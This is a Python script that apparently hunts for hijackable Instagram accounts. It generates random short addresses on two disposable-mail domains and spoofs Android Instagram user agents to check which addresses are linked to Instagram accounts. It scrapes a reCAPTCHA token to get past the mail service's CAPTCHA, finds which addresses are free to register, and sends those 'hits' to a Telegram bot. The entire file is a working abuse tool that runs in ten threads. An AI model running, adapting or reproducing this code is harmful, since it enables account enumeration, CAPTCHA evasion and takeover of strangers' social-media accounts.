import sys
import os
import requests
import string
import random
import time
from threading import Thread, Lock 
import subprocess
import uuid
import json

# Ensure required libraries are imported
try:
    import h2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])

try:
    import httpx
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
    import httpx  

try:
    from cfonts import render
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests telethon pyfiglet rich cfonts bs4"])
    from cfonts import render

# Terminal Colors
YELLOW = '\033[1;33m' 
F = '\033[2;32m' 
ED = '\x1b[38;5;208m'
R = "\033[1;31m" 
M = '\033[2;36m'
Y = '\033[1;34m' 
J = '\033[2;36m'
N = '\033[1;37m'

def banner():
    print(f'''{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
 {N}DEV / @aaeerts{J}|
{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')
banner()

# Fetch inputs from Render Environment Variables
token = os.environ.get("BOT_TOKEN")
ID = os.environ.get("CHAT_ID")

if not token or not ID:
    print("Error: BOT_TOKEN or CHAT_ID environment variables are not set!")
    sys.exit(1)

# Global Variables
used_usernames = set()
lock = Lock()
hit = 0
badig = 0
badmil = 0
dead = 0

def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820"},
        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825"},
        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama"},
        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther"},
    ]
    device = random.choice(devices)
    android_version = random.choice(["11", "12", "13", "14"])
    api_level = {"11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
    dpi = random.choice(["420", "440", "450", "480"])
    width, height = "1080", "2400"
    instagram_ver = "330.1.0.45.110"
    locale = random.choice(["en_US", "ar_SA"])
    random_num = random.randint(300000000, 400000000)
    
    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
          f"{device['device']}; {device['board']}; {locale}; {random_num})")
    return ua

def info(user):
    global hit
    dom = user.split("@")[1]
    hit += 1
    msg = f'''
╔───────────────╗
⌦ [ {dom} ] 
✺ Email: {user}
╚───────────────╝
'''
    try:
        with open('hits1.txt', 'a') as ff:
            ff.write(f'{msg}\n')
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}", timeout=10)
    except Exception as e:
        pass            
        	           
def solve_recaptcha():
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&v=TnA7HacJFoBWt9hnlunBlYfK&size=invisible&anchor-ms=20000&execute-ms=30000&cb=x552vg5lfo2g"
        params = anchor_url.split('?')[1]
        
        headers = {
            'authority': 'www.google.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': '_GRECAPTCHA=09AKhCRwiKbcI7EZjNQFSzLgUCSBS_bUaR2oCM0oi0eG8FYSe2kRId7GR8JP1eBLU-aZl_EhZFXFlAOOTXbmpWU6g',
            'referer': 'https://hi2.in/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'x-client-data': 'CN2OywE='
        }
        
        r = requests.get(f'https://www.google.com/recaptcha/api2/anchor?{params}', headers=headers, timeout=10)
        if 'recaptcha-token" value="' not in r.text:
            return None
            
        recaptcha_token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
        
        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={recaptcha_token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&size=invisible"
        
        reload_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Referer": "https://www.google.com/recaptcha/api2/anchor",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Client-Data": "CN2OywE="
        }
        
        resp = requests.post('https://www.google.com/recaptcha/api2/reload', data=payload, headers=headers)
        if 'resp","' in resp.text:
            return resp.text.split('resp","')[1].split('"')[0]
        return None
    except:
        return None

def check_email(email):
    global badmil
    user = email
    if "@" in email:
        domain = email.split("@")[1]
        prefix = email.split("@")[0]
    else:
        return

    solve = solve_recaptcha() 
    if not solve:
        return

    data = {
        'domain': domain,
        'prefix': prefix,
        'recaptcha': solve,
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "ar,en-US;q=0.9,en;q=0.8",
        'Origin': "https://hi2.in",
        'Referer': "https://hi2.in/",
        'authorization': "Basic bnVsbA==",
    }
    try:
        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=10)
        res = response.json()
        if "already taken" in str(res) or res.get('status') == 'error':
            badmil += 1
        else:
            info(user)    	
    except:
        badmil += 1

def rest(email):
    global hit, badig, badmil, dead
    try:
        # Logging to console cleanly without clearing terminal
        print(f"Hits: {hit} | BadMail: {badmil} | BadIG: {badig} | Dead: {dead} | Testing: {email}")
        
        url = "https://i.instagram.com/api/v1/users/check_email/"
        id_data = str(uuid.uuid4())
        
        payload = {
            "email": email,
            "device_id": id_data,
            "guid": id_data,
            "_csrftoken": "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
        }
        
        headers = {
            'User-Agent': generate_android_ua(),
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '936619743392459'
        }
        
        with httpx.Client(http2=True, timeout=10) as client:
            response = client.post(url, data=payload, headers=headers)
            
            if 'email_is_taken' in response.text:
                check_email(email)
            else:
                badig += 1
                
    except Exception as e:
        dead += 1

def users():    
    while True:
        user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
        user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
        chosen_user = random.choice([user1, user2])
              
        with lock:
            if chosen_user in used_usernames:
                continue
            used_usernames.add(chosen_user)
            
        chos = random.choice(["@hi2.in", "@telegmail.com"])
        email = chosen_user + chos
        rest(email)
        time.sleep(0.5)  # Added brief delay to avoid instant CPU spin-lock

# Start threads
for _ in range(10):
    Thread(target=users, daemon=True).start()

# Keep main thread alive
while True:
    time.sleep(1)
